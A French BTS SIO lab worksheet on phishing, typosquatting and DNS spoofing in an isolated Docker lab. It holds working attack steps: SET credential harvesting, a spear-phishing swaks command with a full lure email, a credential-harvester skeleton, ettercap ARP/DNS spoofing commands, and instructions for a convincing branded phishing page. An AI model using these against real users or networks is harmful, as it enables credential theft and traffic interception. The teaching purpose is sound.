# TP 3.2 — Préservation de l'identité numérique de l'organisation

## Attaques sur l'identité numérique : Phishing, Typosquatting & DNS Spoofing

---

| | |
|---|---|
| **Module** | Bloc 3 — Cybersécurité des services informatiques |
| **Compétence** | 3.2 — Préservation de l'identité numérique de l'organisation |
| **Formation** | BTS SIO 2ᵉ année — Options SISR & SLAM |
| **Établissement** | IRIS Nice (Mediaschool) |
| **Formateur** | Yan |
| **Durée** | 1 après-midi (~3h30) |
| **Environnement** | Laboratoire Docker — Kali Linux v3 (CERTA) |

---

## Compétences visées du référentiel BTS SIO

| Référence | Compétence |
|---|---|
| B3.2 | Préserver l'identité numérique de l'organisation |
| B3.2.1 | Protéger l'identité numérique d'une organisation |
| B3.2.2 | Déployer les moyens appropriés de preuve électronique |
| B3.1 | Protéger les données à caractère personnel |
| B3.3 | Sécuriser les équipements et les usages des utilisateurs |

**Savoirs associés mobilisés :**

- Charte informatique, sensibilisation des utilisateurs
- Gestion des identités et des accès (IAM)
- Protocoles d'authentification des messages (SPF, DKIM, DMARC)
- Certificats numériques et PKI
- Sécurité DNS (DNSSEC)
- Ingénierie sociale et vecteurs d'attaque

---

## Objectifs pédagogiques

À l'issue de ce TP, vous serez capable de :

1. **Reproduire** une attaque par ingénierie sociale (phishing + typosquatting) dans un environnement contrôlé
2. **Mettre en œuvre** une attaque de type DNS Spoofing et en comprendre les mécanismes
3. **Analyser** le trafic réseau à l'aide de Wireshark pour identifier les traces d'une attaque
4. **Identifier** les vulnérabilités exploitées et les relier aux concepts du cours (SPF/DKIM/DMARC, DNSSEC, certificats)
5. **Proposer** des contre-mesures techniques et organisationnelles adaptées
6. **Rédiger** un rapport de sécurité synthétique avec des recommandations professionnelles

---

## Contexte — Mise en situation professionnelle

### L'entreprise K Beauty Cosmetics

Vous êtes **technicien·ne en cybersécurité** au sein de la DSI de **K Beauty Cosmetics**, une PME niçoise de 85 salariés spécialisée dans la vente en ligne de cosmétiques coréens, située 22 rue de l'Hôtel des Postes, 06000 Nice. L'entreprise exploite :

- Un site e-commerce public : `www.kbeauty-cosmetics.com` (hébergé sur Shopify)
- Un domaine interne : `nicecosmetics.fr` (messagerie, intranet, ERP)
- Une messagerie professionnelle : `@nicecosmetics.fr`
- Un ERP interne accessible via le réseau local

Le RSSI (Responsable de la Sécurité des Systèmes d'Information), M. Durand, vous confie une mission :

> « *Plusieurs de nos clients ont signalé avoir reçu des emails suspects leur demandant de mettre à jour leurs informations de paiement sur un site qui ressemblait au nôtre (kbeauty-cosmetics.com). Par ailleurs, un employé du service comptabilité a été redirigé vers un faux site intranet la semaine dernière via notre domaine interne nicecosmetics.fr. Je souhaite que vous reproduisiez ces attaques en laboratoire pour comprendre leur fonctionnement et me proposer des contre-mesures concrètes.* »

Votre mission se décompose en trois phases :

| Phase | Attaque simulée | Durée estimée |
|---|---|---|
| **Partie 1** | Phishing & Typosquatting (ingénierie sociale) | ~2h |
| **Partie 2** | DNS Spoofing | ~1h |
| **Partie 3** | Contre-mesures & rapport de sécurité | ~30 min |

>  **AVERTISSEMENT LÉGAL ET ÉTHIQUE**
>
> Les techniques présentées dans ce TP sont **exclusivement destinées à un usage pédagogique** dans un environnement de laboratoire isolé. Toute utilisation de ces techniques en dehors de ce cadre est **illégale** (articles 323-1 à 323-8 du Code pénal) et passible de poursuites. Vous vous engagez à ne jamais utiliser ces connaissances à des fins malveillantes.

---

## Prérequis techniques

### Connaissances requises

- Bases de l'administration Linux (ligne de commande, navigation dans l'arborescence)
- Notions de réseau : modèle TCP/IP, DNS, HTTP/HTTPS, ARP
- Cours théorique Bloc 3.2 (slides 1 à 24) : identité numérique, menaces, protocoles de sécurité

### Environnement technique

| Composant | Version / Détail |
|---|---|
| Docker & Docker Compose | Dernière version stable |
| Laboratoire CERTA | Kali v3 — Docker (lab1 et lab2) |
| Système hôte | Linux (recommandé) ou Windows avec WSL2 |
| RAM disponible | Minimum 8 Go |
| Espace disque | Minimum 10 Go libres |

### Vérification de l'environnement

Avant de commencer, exécutez les commandes suivantes pour vérifier que votre environnement est opérationnel :

```bash
# Vérifier Docker
docker --version

# Vérifier l'espace disque disponible
df -h /

# Vérifier la RAM disponible
free -h
```

>  **Note :** Si Docker n'est pas installé, suivez les instructions officielles : https://docs.docker.com/engine/install/

---

## Partie 1 — Ingénierie sociale : Phishing & Typosquatting (~2h)

### 1.1 — Mise en place du laboratoire Docker CERTA

Le laboratoire CERTA fournit un environnement Docker complet simulant un réseau d'entreprise avec plusieurs machines : un poste attaquant (Kali Linux), un serveur cible, et des postes clients.

#### Récupération du laboratoire

```bash
# Cloner le dépôt du Lab 1 (ingénierie sociale)
git clone https://forge.apps.education.fr/reseau-certa/bts-sio/labos-kali-docker/lab1.git
cd lab1

# Consulter la documentation du lab
cat README.md
```

> Si le dépôt Git n'est pas accessible, récupérez l'archive ZIP depuis le site du CERTA :
> https://gravelines.reseaucerta.org/sites/default/files/labo-kali-docker-situations_et_laboratoires_v3.zip

#### Lancement de l'environnement

```bash
# Créer le laboratoire (téléchargement ~2.4 Go pour l'image Kali au premier lancement)
bash gestion_lab1.sh -c

# Autres commandes utiles du script de gestion :
#   bash gestion_lab1.sh -l   # Lancer les conteneurs (si déjà créés)
#   bash gestion_lab1.sh -s   # Stopper les conteneurs
#   bash gestion_lab1.sh -d   # Supprimer les conteneurs
```

#### Identifiants de connexion

Les conteneurs utilisent les identifiants suivants :

| Paramètre | Valeur |
|---|---|
| **Utilisateur** | `etusio` |
| **Mot de passe** | `Fghijkl1234*` |

#### Topologie réseau du laboratoire

Le lab1 déploie **4 conteneurs** sur le réseau `192.168.56.0/24` (bridge `bridge_interne_lab`) :

| Conteneur | Hostname | Rôle | Adresse IP |
|---|---|---|---|
| `serveur-lab1` | `srvssh` | Serveur DNS (BIND9) | `192.168.56.10` |
| `client-lab1` | `clissh` | Client (XFCE, Wireshark, Firefox) | `192.168.56.11` |
| `kali-lab1` | `kali` | Attaquant (ettercap, wireshark, nmap, ssh-mitm) | `192.168.56.12` |
| `routeur-lab1` | `routeur` | Routeur (NAT + redirection de ports) | `192.168.56.254` |

```
         ┌────────────────────────────────────────────────────────┐
         │            Réseau bridge_interne_lab                   │
         │                 192.168.56.0/24                        │
         │                                                        │
         │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐ │
         │  │ serveur-lab1 │  │  client-lab1 │  │  kali-lab1   │ │
         │  │  (srvssh)    │  │  (clissh)    │  │  (kali)      │ │
         │  │ DNS - BIND9  │  │ XFCE/Firefox │  │ Attaquant    │ │
         │  │ .56.10       │  │ .56.11       │  │ .56.12       │ │
         │  └──────────────┘  └──────────────┘  └──────────────┘ │
         │                                                        │
         │                   ┌──────────────┐                     │
         │                   │ routeur-lab1 │                     │
         │                   │  (routeur)   │                     │
         │                   │ NAT/Routage  │                     │
         │                   │ .56.254      │                     │
         │                   └──────┬───────┘                     │
         └──────────────────────────┼─────────────────────────────┘
                                    │
                                Internet
```

Le DNS est configuré pour le domaine `local.sio.fr` avec les enregistrements :
- `srvssh.local.sio.fr` → `192.168.56.10`
- `clissh.local.sio.fr` → `192.168.56.11`
- `routeur.local.sio.fr` → `192.168.56.254`

#### Accès aux conteneurs

```bash
# Accéder au conteneur Kali (méthode 1 : docker exec)
docker exec -it kali-lab1 bash

# Accéder au conteneur Kali (méthode 2 : SSH depuis l'hôte)
ssh etusio@192.168.56.12

# Accéder au conteneur Kali (méthode 3 : RDP sur le port 33389)
# Accéder au conteneur Client (méthode 3 : RDP sur le port 23389)
```

#### Accès au bureau graphique (RDP)

Les conteneurs `client-lab1` et `kali-lab1` disposent d'un serveur xRDP. Pour accéder au bureau graphique :

**Depuis Linux :**

```bash
# Méthode 1 : xfreerdp (recommandé)
xfreerdp /v:192.168.56.11 /u:etusio /p:Fghijkl1234* /size:1280x720

# Méthode 2 : SSH avec redirection X11 (ouvre une application graphique)
ssh -X etusio@192.168.56.11 firefox
```

**Depuis Windows :**
- Ouvrez "Connexion Bureau à Distance" (`mstsc.exe`)
- Adresse : `192.168.56.11`

| Conteneur | Adresse RDP |
|---|---|
| `client-lab1` | `192.168.56.11:3389` |
| `kali-lab1` | `192.168.56.12:3389` |

>  L'accès RDP est particulièrement utile pour utiliser Firefox sur le `client-lab1` et vérifier visuellement l'attaque de phishing.

>  **Ressources :**
> - [Documentation xfreerdp](https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface)
> - [Documentation SSH X11 forwarding](https://wiki.archlinux.org/title/OpenSSH#X11_forwarding)

#### Vérification de l'environnement

Après la création du lab, vérifiez que tout fonctionne :

```bash
# Vérifier que tous les conteneurs sont actifs
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}" | grep lab1

# Tester la connectivité depuis Kali
docker exec -it kali-lab1 ping -c 2 192.168.56.10
docker exec -it kali-lab1 ping -c 2 192.168.56.11

# Tester la résolution DNS
docker exec -it kali-lab1 nslookup srvssh.local.sio.fr 192.168.56.10
```

>  **Question 1** — Relevez l'architecture réseau du laboratoire : les **4 conteneurs** (noms, hostnames, adresses IP, services actifs). Réalisez un **schéma réseau** du lab en identifiant chaque composant et son rôle, y compris le routeur.

---

### 1.2 — Reconnaissance et préparation de l'attaque

Avant toute attaque, un attaquant effectue une phase de **reconnaissance**. Vous allez simuler cette étape.

#### Identification de la cible

Depuis le conteneur Kali :

```bash
# Accéder au conteneur Kali
docker exec -it kali-lab1 bash

# Scanner le réseau pour identifier les machines actives
nmap -sn 192.168.56.0/24
```

Vous devriez voir les machines suivantes : `192.168.56.10` (serveur DNS), `192.168.56.11` (client), `192.168.56.12` (kali), `192.168.56.254` (routeur).

```bash
# Identifier les services du serveur DNS
nmap -sV -p 1-1000 192.168.56.10

# Scan approfondi du serveur
nmap -A -T4 192.168.56.10
```

>  **Question 2** — Quels services sont actifs sur le serveur DNS (`192.168.56.10`) ? Quels ports sont ouverts ? Quelles informations complémentaires le scan `-A` révèle-t-il ?

#### Exploration du réseau

```bash
# Vérifier la résolution DNS depuis Kali
nslookup srvssh.local.sio.fr 192.168.56.10
nslookup clissh.local.sio.fr 192.168.56.10
```

>  **Question 3** — Que révèle la phase de reconnaissance sur l'infrastructure du lab ? Quelles informations un attaquant pourrait-il exploiter pour préparer une attaque ?

---

### 1.3 — Création du site de phishing avec SET

Le **Social Engineering Toolkit (SET)** est un framework open source intégré à Kali Linux, conçu pour automatiser les attaques par ingénierie sociale. Vous allez l'utiliser pour cloner un site de connexion et démontrer le principe du Credential Harvester.

#### Installation et lancement de SET

SET (Social Engineering Toolkit) n'est **pas pré-installé** dans l'image `kali-linux-core` du lab. Vous devez l'installer :

```bash
# Depuis le conteneur Kali
docker exec -it kali-lab1 bash

# Installation de SET (depuis GitHub car le paquet apt a des conflits de dépendances)
GIT_SSL_NO_VERIFY=1 git clone https://github.com/trustedsec/social-engineer-toolkit.git /opt/setoolkit
cd /opt/setoolkit
pip3 install pexpect
python3 setup.py install
# Ignorer les erreurs pycrypto - SET fonctionne sans

# Installer aussi Apache2 pour servir les pages piégées
apt install -y apache2

# Lancer SET
setoolkit
```

>  **Note :** Le paquet `set` via `apt install` ne fonctionne pas dans le conteneur Kali du lab1 en raison de conflits de dépendances (metasploit-framework, kali-desktop-xfce). L'installation depuis GitHub est la méthode recommandée. Ignorez les erreurs liées à `pycrypto` lors de l'installation — elles n'affectent pas le fonctionnement du Credential Harvester.

#### Navigation dans les menus SET

Suivez les étapes ci-dessous en saisissant les numéros correspondants :

```
1) Social-Engineering Attacks
   └─> 2) Website Attack Vectors
       └─> 3) Credential Harvester Attack Method
           └─> 1) Web Templates
               └─> 2) Google
```

SET vous demandera ensuite :

1. **IP address for the POST back** : acceptez l'adresse IP par défaut (`192.168.56.12`) ou saisissez-la manuellement

SET va alors :

- Générer une page de connexion basée sur le template Google
- Démarrer un serveur web local sur le port 80 de la machine Kali
- Intercepter les identifiants saisis par la victime

>  **Pourquoi « Web Templates » et non « Site Cloner » ?** L'option « Site Cloner » nécessite un accès internet fiable pour télécharger la page du site cible. Dans l'environnement Docker du lab, l'accès internet via le conteneur routeur est souvent instable (timeouts HTTP). L'option « Web Templates » fonctionne **sans connexion internet** et suffit pour démontrer le principe du Credential Harvester.

#### Vérification du site cloné

Depuis un navigateur ou en ligne de commande :

```bash
# Depuis le conteneur client, vérifier que le faux site est accessible
docker exec -it client-lab1 bash
curl -s http://192.168.56.12 | head -30
```

>  **Question 4** — Comparez visuellement le faux site de connexion et un vrai site de connexion Google. Quelles différences un utilisateur averti pourrait-il repérer ? Quelles différences sont invisibles pour un utilisateur non formé ?

>  **Question 5** — Dans la barre d'adresse du navigateur, quelle est la différence fondamentale entre le site légitime et le site cloné ? En quoi un certificat HTTPS (TLS) permettrait-il de limiter ce type d'attaque ?

---

### 1.4 — Typosquatting : enregistrement d'un nom de domaine frauduleux

Dans un scénario réel, l'attaquant ne se contente pas d'utiliser une adresse IP : il enregistre un **nom de domaine similaire** au domaine légitime pour tromper la victime. C'est le **typosquatting**.

#### Exemples de domaines typosquattés pour `nicecosmetics.fr`

| Technique | Domaine frauduleux | Explication |
|---|---|---|
| Lettre manquante | `nicecosmeticsfr` | Suppression du point |
| Substitution de caractère | `nicecosmeti**k**s.fr` | c → k |
| Transposition | `nicecosmetcis.fr` | Inversion de lettres |
| Ajout de caractère | `nicecosmetics**s**.fr` | Double lettre |
| Homoglyphe | `nícecosmetícs.fr` | Caractères Unicode similaires |
| TLD différent | `nicecosmetics.**com**` | Extension différente |

#### Configuration du domaine typosquatté

Vous allez configurer le serveur DNS du lab pour résoudre un faux domaine vers la machine Kali.

```bash
# Accéder au conteneur serveur DNS
docker exec -it serveur-lab1 bash

# Éditer la zone DNS (le fichier exact dépend de la configuration du lab)
# Ajouter une entrée pour le domaine typosquatté
# Exemple avec le fichier de zone BIND :
echo "nicekosmetics.fr.    IN    A    192.168.56.12" >> /etc/bind/db.local

# Recharger la configuration DNS
rndc reload
```

>  Adaptez les chemins et commandes en fonction de la configuration exacte du lab CERTA.

#### Vérification de la résolution DNS

```bash
# Depuis le conteneur client
docker exec -it client-lab1 bash
nslookup nicekosmetics.fr 192.168.56.10
dig @192.168.56.10 nicekosmetics.fr
```

>  **Question 6** — Expliquez en quoi le typosquatting renforce la crédibilité d'une attaque de phishing. Donnez trois exemples de domaines typosquattés pour le domaine `iris-mediaschool.fr`.

>  **Question 7** — Recherchez et expliquez ce qu'est le **protocole WHOIS**. Comment un administrateur pourrait-il surveiller l'enregistrement de domaines similaires au sien ?

---

### 1.5 — Envoi d'un email de phishing ciblé (spear phishing)

Vous allez maintenant composer un email de phishing destiné à un employé de K Beauty Cosmetics, en utilisant le domaine typosquatté.

#### Préparation de l'email avec `swaks`

>  **Note importante :** `swaks` n'est **pas pré-installé** dans le conteneur Kali du lab1. De plus, le lab ne dispose pas d'un serveur SMTP configuré. Cette section est donc une **démonstration théorique** : vous allez construire la commande et analyser sa structure, sans l'exécuter réellement.

Si vous souhaitez tester l'envoi réel, vous devrez installer un serveur SMTP (ex : `postfix`) sur le conteneur serveur, puis installer `swaks` sur Kali :

```bash
# (Optionnel) Installer swaks sur le conteneur Kali
sudo apt update && sudo apt install -y swaks
```

Voici la commande `swaks` qui serait utilisée dans un scénario réel :

```bash
# Commande d'envoi d'email de phishing (DÉMONSTRATION — ne fonctionnera pas sans serveur SMTP)
swaks \
  --to "comptabilite@nicecosmetics.fr" \
  --from "support@nicekosmetics.fr" \
  --header "Subject: [URGENT] Mise à jour de sécurité requise" \
  --body "Bonjour,

Suite à une tentative d'intrusion détectée sur nos systèmes, nous vous
demandons de vérifier vos identifiants en cliquant sur le lien suivant :

http://nicekosmetics.fr/connexion

Cette opération est obligatoire et doit être effectuée sous 24h.

Cordialement,
Le Service Informatique
K Beauty Cosmetics" \
  --server 192.168.56.10
```

>  **Exercice alternatif :** Analysez la commande ci-dessus et identifiez chaque paramètre. Rédigez le contenu complet de l'email tel qu'il apparaîtrait dans la boîte de réception de la victime (en-têtes From, To, Subject et corps du message).

>  **Question 8** — Analysez l'email que vous venez de créer. Identifiez **au moins 5 indices** qui devraient alerter un utilisateur formé à la cybersécurité.

>  **Question 9** — Expliquez le rôle des protocoles **SPF**, **DKIM** et **DMARC** dans la protection contre ce type d'attaque. Pour chaque protocole, précisez :
> - Son principe de fonctionnement
> - Ce qu'il vérifie exactement
> - Ses limites

>  **Question 10** — Rédigez un **enregistrement SPF** valide pour le domaine `nicecosmetics.fr`, sachant que les emails légitimes sont envoyés uniquement depuis le serveur `mail.nicecosmetics.fr` (IP : `203.0.113.10`).

---

### 1.6 — Capture des identifiants et analyse

#### Simulation de la victime

Depuis le conteneur client, simulez un utilisateur qui se rend sur le faux site et saisit ses identifiants :

```bash
# Depuis le conteneur client — Simuler une connexion au faux site
docker exec -it client-lab1 bash
curl -X POST http://192.168.56.12/login \
  -d "username=jean.dupont@nicecosmetics.fr&password=MonMotDePasse123"
```

#### Observation côté attaquant

Revenez sur le terminal SET dans le conteneur Kali. Les identifiants capturés doivent apparaître dans la sortie de SET.

```bash
# Vérifier les logs de SET
cat /root/.set/reports/
```

>  **Question 11** — Les identifiants ont-ils été capturés en clair ? Expliquez pourquoi et en quoi l'utilisation de **HTTPS avec un certificat valide** sur le site légitime protège (ou ne protège pas) contre cette attaque.

>  **Question 12** — Dans le contexte d'une entreprise, quel mécanisme d'authentification rendrait la capture d'identifiants moins exploitable, même si l'utilisateur se fait piéger ? Justifiez votre réponse.

---

### 1.6bis — Collecteur d'identifiants Python (pour la Partie 2)

Dans la Partie 2 (DNS Spoofing), vous aurez besoin d'un serveur web qui remplit **deux rôles simultanément** :
1. **Servir votre page de phishing** (requête GET)
2. **Capturer les identifiants** soumis par la victime (requête POST)

SET utilise le port 80 pour son propre serveur, et Apache sert des pages statiques sans capturer les données POST de manière exploitable. Vous allez donc créer votre propre **collecteur d'identifiants** en Python.

#### Le concept

Le script Python doit :
- Écouter sur le port **80** (HTTP standard)
- Sur une requête **GET `/`** : servir votre page de phishing HTML
- Sur une requête **POST `/`** : extraire les champs `email` et `password`, les enregistrer dans `/opt/creds.txt` avec un horodatage, puis **rediriger la victime vers le vrai site** (code HTTP 302)

#### Squelette du script

Créez le fichier `/opt/harvester.py` sur le conteneur Kali. Voici un squelette — **les parties essentielles sont à compléter par vos soins** :

```python
#!/usr/bin/env python3
"""
Collecteur d'identifiants HTTP — TP Cybersécurité BTS SIO
Usage : python3 /opt/harvester.py
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime

PHISHING_PAGE = "/var/www/html/index.html"
CREDS_FILE = "/opt/creds.txt"
REDIRECT_URL = "https://kbeauty-cosmetics.com/"
PORT = 80


class HarvesterHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        """Sert la page de phishing au navigateur de la victime."""
        # TODO : Lire le fichier PHISHING_PAGE
        # TODO : Envoyer une réponse HTTP 200 avec le contenu HTML
        # Indice : self.send_response(), self.send_header(), self.end_headers(), self.wfile.write()
        pass

    def do_POST(self):
        """Capture les identifiants soumis par le formulaire."""
        # TODO : Lire le corps de la requête POST (self.rfile, Content-Length)
        # TODO : Décoder les données du formulaire (parse_qs)
        # TODO : Extraire 'email' et 'password'
        # TODO : Écrire les identifiants dans CREDS_FILE avec horodatage
        # TODO : Rediriger la victime vers REDIRECT_URL (HTTP 302)
        # Indice : self.send_response(302), self.send_header('Location', ...)
        pass


if __name__ == "__main__":
    # TODO : Créer le serveur HTTP et le lancer
    # Indice : HTTPServer(('0.0.0.0', PORT), HarvesterHandler)
    pass
```

>  **Indices supplémentaires :**
> - Pour lire le corps du POST : `content_length = int(self.headers['Content-Length'])` puis `self.rfile.read(content_length)`
> - Pour décoder les données : `parse_qs(post_data.decode('utf-8'))`
> - Les valeurs dans `parse_qs` sont des listes : `data['email'][0]`
> - Pour écrire dans un fichier en mode ajout : `open(CREDS_FILE, 'a')`

 **Ressources :**
- [Python http.server — Documentation officielle](https://docs.python.org/3/library/http.server.html)
- [Python urllib.parse](https://docs.python.org/3/library/urllib.parse.html)

#### Test du collecteur

Une fois votre script complété :

```bash
# Lancer le collecteur (en tant que root pour le port 80)
python3 /opt/harvester.py &

# Tester avec curl
curl http://localhost/
curl -X POST http://localhost/ -d "email=test@test.com&password=secret123"

# Vérifier les identifiants capturés
cat /opt/creds.txt
```

>  **Question 13** — Pourquoi est-il important de rediriger la victime vers le site légitime après avoir capturé ses identifiants ? En quoi cette redirection rend-elle l'attaque plus difficile à détecter ?

---

## Partie 2 — DNS Spoofing (~1h)

### 2.1 — Mise en place du laboratoire

Le DNS Spoofing est réalisé dans le **même environnement Lab 1** que la Partie 1. Les outils nécessaires (`ettercap-graphical`, `wireshark`, `tshark`, `nmap`) sont déjà pré-installés dans le conteneur Kali.

Si vous avez arrêté le lab, relancez-le :

```bash
# Relancer les conteneurs si nécessaire
cd lab1
bash gestion_lab1.sh -l
```

```bash
# Accéder au conteneur Kali
docker exec -it kali-lab1 bash

# Vérifier la présence des outils nécessaires
which ettercap
which wireshark
which tshark
```

>  **Note :** `ettercap-graphical` est pré-installé et inclut le mode ligne de commande (`-T`). Il n'est **pas nécessaire** d'installer `ettercap-text-only`.

---

### 2.2 — Comprendre l'attaque DNS Spoofing

Le DNS Spoofing consiste à **falsifier les réponses DNS** pour rediriger un utilisateur vers une adresse IP contrôlée par l'attaquant. Cette attaque s'appuie généralement sur un **empoisonnement du cache ARP** (ARP Spoofing) pour intercepter le trafic entre la victime et son serveur DNS.

#### Schéma de l'attaque

```
┌──────────┐                    ┌──────────┐                    ┌──────────┐
│  Client   │  ── requête DNS ──>│ Attaquant │  ── requête DNS ──>│ Serveur  │
│ (victime) │                    │  (Kali)   │                    │   DNS    │
│           │ <── fausse réponse │           │                    │          │
│           │    (IP attaquant)  │           │                    │          │
└──────────┘                    └──────────┘                    └──────────┘
      │                                                               
      │  L'utilisateur est redirigé                                   
      │  vers le faux site hébergé                                    
      ▼  sur la machine de l'attaquant                                
┌─────────────┐                                                       
│  Faux site  │                                                       
│ (phishing)  │                                                       
└─────────────┘                                                       
```

>  **Question 14** — Expliquez avec vos propres mots la différence entre le DNS Spoofing et le typosquatting. Dans quel cas chaque technique est-elle la plus dangereuse ?

---

### 2.3 — Phase 1 : Préparation de la page de phishing K Beauty Cosmetics

Avant de lancer l'attaque DNS Spoofing, vous devez préparer le faux site web vers lequel la victime sera redirigée. L'objectif est de créer une page de connexion **visuellement convaincante** qui imite le site réel de K Beauty Cosmetics.

#### Étude du site cible

Rendez-vous sur le vrai site : **https://kbeauty-cosmetics.com/**

Analysez attentivement :
- La **charte graphique** : couleurs dominantes, typographies, mise en page
- Le **logo** et les éléments visuels de la marque
- La **structure** d'une page de connexion e-commerce typique (Shopify)
- Les **éléments de confiance** : mentions légales, icônes de sécurité, etc.

>  **Astuce :** Utilisez les outils de développement du navigateur (`F12` → onglet "Inspecteur" / "Elements") pour étudier le CSS, les couleurs et les polices utilisées.

#### Création de la page de phishing

Créez votre propre page de phishing dans `/var/www/html/index.html` sur le conteneur Kali. Votre page doit :

- **Reproduire l'apparence** du site K Beauty Cosmetics (couleurs, branding, mise en page)
- Contenir un **formulaire de connexion** avec les champs `email` et `password`
- Le formulaire doit utiliser la méthode **POST** vers `/` : `<form method="POST" action="/">`
- Être suffisamment **crédible** pour tromper un utilisateur non averti

>  **Astuce logo :** Vous pouvez télécharger le logo du vrai site avec `wget` ou `curl` et l'intégrer à votre page :
> ```bash
> # Exemple de téléchargement d'une image depuis le site
> wget --no-check-certificate -O /var/www/html/logo.png "URL_DU_LOGO"
> # Ou avec curl :
> curl -k -o /var/www/html/logo.png "URL_DU_LOGO"
> ```

>  **Important :** Ne vous contentez pas de copier-coller le code source du site réel. L'objectif pédagogique est de **comprendre** ce qui rend une page de phishing convaincante. Construisez votre page en réfléchissant à chaque élément visuel.

 **Ressources :**
- [MDN — Introduction au HTML](https://developer.mozilla.org/fr/docs/Learn/HTML/Introduction_to_HTML)
- [MDN — Les formulaires HTML](https://developer.mozilla.org/fr/docs/Web/HTML/Element/form)
- [Documentation Apache httpd](https://httpd.apache.org/docs/2.4/fr/)

#### Vérification de la page

```bash
# Démarrer Apache pour servir la page (si pas déjà actif)
service apache2 start

# Vérifier que la page est bien servie
curl -s http://localhost/ | head -20
```

>  **Question 15** — Quels éléments visuels avez-vous intégrés à votre page de phishing pour la rendre convaincante ? Expliquez pourquoi chaque élément contribue à la crédibilité de l'attaque.

#### Mise en place du collecteur d'identifiants

Pour l'attaque DNS Spoofing, vous allez utiliser le **collecteur Python** que vous avez développé dans la section 1.6bis, à la place d'Apache. Le collecteur sert la page de phishing ET capture les identifiants en une seule opération.

```bash
# 1. Arrêter SET s'il tourne encore (Ctrl+C dans le terminal SET)

# 2. Arrêter Apache (le collecteur Python va utiliser le port 80)
service apache2 stop

# 3. Lancer le collecteur d'identifiants Python
python3 /opt/harvester.py &

# 4. Vérifier que le collecteur écoute bien sur le port 80
ss -tlnp | grep :80

# 5. Vérifier que la page de phishing est servie correctement
curl http://localhost/
```

---

### 2.4 — Phase 2 : ARP Spoofing (empoisonnement ARP)

L'ARP Spoofing est le prérequis du DNS Spoofing dans un réseau local. Il permet à l'attaquant de se faire passer pour la passerelle (ou le serveur DNS) auprès de la victime.

#### Activation du routage IP sur la machine attaquante

```bash
# Activer le forwarding IP (indispensable pour ne pas couper la connexion)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Vérifier
cat /proc/sys/net/ipv4/ip_forward
```

#### Lancement de l'ARP Spoofing avec ettercap

```bash
# Identifier les adresses IP et MAC des machines du réseau
#   - Victime (client) : 192.168.56.11
#   - Serveur DNS : 192.168.56.10
#   - Attaquant (Kali) : 192.168.56.12

# Lancer ettercap en mode texte avec ARP poisoning
ettercap -T -q -i eth0 -M arp:remote /192.168.56.11// /192.168.56.10//
```

> **Explication des paramètres :**
> - `-T` : mode texte (pas d'interface graphique)
> - `-q` : mode silencieux (quiet)
> - `-i eth0` : interface réseau à utiliser
> - `-M arp:remote` : attaque Man-in-the-Middle par ARP
> - `/192.168.56.11//` : cible 1 (la victime — client)
> - `/192.168.56.10//` : cible 2 (le serveur DNS)

#### Vérification de l'empoisonnement ARP

Depuis le conteneur client, vérifiez la table ARP :

```bash
# Depuis le conteneur client
docker exec -it client-lab1 bash
arp -a
```

Vous devez observer que l'adresse MAC associée au serveur DNS (`192.168.56.10`) a été remplacée par l'adresse MAC de la machine Kali. Notez cette adresse MAC — elle devrait être identique pour les deux entrées (serveur DNS et routeur), ce qui confirme l'empoisonnement ARP.

```bash
# Vérification alternative avec arp -n (format numérique)
arp -n
```

>  **Question 16** — Avant et après l'attaque ARP, relevez le contenu de la table ARP du client (`arp -n`). Quelle entrée a été modifiée ? Quelle adresse MAC apparaît désormais pour le serveur DNS ? Est-elle identique à celle de la machine Kali ?

---

### 2.5 — Phase 3 : DNS Spoofing avec ettercap

#### Configuration du fichier de résolution DNS frauduleux

```bash
# Sur le conteneur Kali, créer le fichier de résolution
# Format : domaine_à_spoofer    IP_de_redirection
cat > /tmp/dns_spoof.conf << 'EOF'
nicecosmetics.fr    A    192.168.56.12
www.nicecosmetics.fr    A    192.168.56.12
*.nicecosmetics.fr    A    192.168.56.12
EOF
```

>  **Note :** Le domaine `nicecosmetics.fr` est un domaine **fictif** qui n'est pas configuré dans le serveur DNS BIND du lab (celui-ci gère uniquement la zone `local.sio.fr`). Avant l'attaque, une requête `nslookup nicecosmetics.fr` renverra `NXDOMAIN` (domaine inexistant). C'est précisément le rôle du DNS Spoofing : ettercap interceptera les requêtes DNS du client et renverra une **fausse réponse** pointant vers l'IP de l'attaquant, sans que le domaine ait besoin d'exister dans BIND.

#### Activation du plugin DNS Spoof dans ettercap

Arrêtez ettercap s'il est déjà en cours d'exécution (`Ctrl+C` ou `q`), puis configurez le fichier DNS d'ettercap et relancez avec le plugin `dns_spoof` :

```bash
# Configurer le fichier DNS d'ettercap
echo "nicecosmetics.fr      A   192.168.56.12" >> /etc/ettercap/etter.dns
echo "*.nicecosmetics.fr    A   192.168.56.12" >> /etc/ettercap/etter.dns

# Lancer l'attaque ARP + DNS spoofing
ettercap -T -q -i eth0 -M arp:remote -P dns_spoof /192.168.56.11// /192.168.56.10//
```

> **Nouveau paramètre :**
> - `-P dns_spoof` : active le plugin de DNS Spoofing
>
> Dans la sortie d'ettercap, vous devriez voir apparaître des lignes comme :
> ```
> dns_spoof: A [nicecosmetics.fr] spoofed to [192.168.56.12]
> ```

#### Vérification du DNS Spoofing

Depuis le conteneur client :

```bash
# Accéder au conteneur client
docker exec -it client-lab1 bash

# Résoudre le domaine cible — doit retourner 192.168.56.12 (IP de l'attaquant)
nslookup nicecosmetics.fr 192.168.56.10
dig nicecosmetics.fr

# Tenter d'accéder au site
curl -v http://nicecosmetics.fr
```

>  **Question 17** — Le domaine `nicecosmetics.fr` résout-il désormais vers l'adresse IP de l'attaquant ? Montrez la preuve par une capture d'écran de la commande `nslookup` ou `dig`.

>  **Note importante sur DNS-over-HTTPS (DoH)**
>
> Les navigateurs modernes (Firefox, Chrome) activent par défaut le **DNS-over-HTTPS (DoH)**, qui chiffre les requêtes DNS et les envoie directement à des serveurs comme Cloudflare (1.1.1.1) ou Google (8.8.8.8), **contournant complètement le DNS local et le fichier `/etc/hosts`**.
>
> Cela signifie que le DNS Spoofing par ettercap **ne fonctionne pas** contre un navigateur avec DoH activé. C'est précisément une des **contre-mesures** modernes contre ce type d'attaque.
>
> Pour tester l'attaque dans le navigateur du `client-lab1`, le DoH n'est pas activé par défaut dans le conteneur Docker, donc l'attaque fonctionnera. Mais sur une machine réelle, il faudrait d'abord désactiver le DoH.
>
>  **Ressources :**
